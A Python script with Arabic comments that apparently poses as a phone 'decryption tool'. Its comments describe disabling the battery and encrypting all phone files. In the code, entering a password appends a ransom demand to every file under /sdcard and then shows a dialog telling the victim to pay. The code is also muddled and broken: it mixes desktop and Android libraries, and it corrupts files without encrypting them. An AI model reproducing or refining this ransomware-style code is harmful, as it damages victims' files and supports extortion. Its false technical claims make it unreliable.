import android
import os
import tkinter as tk
from tkinter import messagebox

# تعطيل البطارية
def تعطيل_البطارية():
    droid = android.Android()
    droid.batteryStartMonitoring()
    droid.batteryStopMonitoring()

# تشفير كل ملفات الهاتف
def تشفير_الملفات(مجلد_التشفير, رسالة_الفدية):
    for ملف in os.listdir("/sdcard"):
        مسار_الملف = os.path.join("/sdcard", ملف)
        if os.path.isfile(مسار_الملف):
            with open(مسار_الملف, "a") as الملف:
                الملف.write(رسالة_الفدية)

# واجهة رسومية
def فك_تشفير():
    كلمة_الفك = كلمة_الفك_entry.get()
    if كلمة_الفك == "123":
        تعطيل_البطارية()
        تشفير_الملفات("/sdcard", "تم تشفير ملفات هاتفك، قم بدفع فدية لاستعادة الوصول.")
        messagebox.showinfo("نجاح", "تم فك تشفير ملفات الهاتف بنجاح! قم بدفع الفدية لاستعادة الوصول.")
    else:
        messagebox.showerror("خطأ", "كلمة فك التشفير غير صحيحة!")

# إعداد واجهة المستخدم
root = tk.Tk()
root.title("أداة فك تشفير الهاتف")
root.geometry("400x200")

تسمية_كلمة_الفك = tk.Label(root, text="أدخل كلمة فك التشفير:")
تسمية_كلمة_الفك.pack(pady=10)

كلمة_الفك_entry = tk.Entry(root, show="*")
كلمة_الفك_entry.pack(pady=10)

زر_فك_تشفير = tk.Button(root, text="فك تشفير", command=فك_تشفير)
زر_فك_تشفير.pack(pady=20)

root.mainloop()
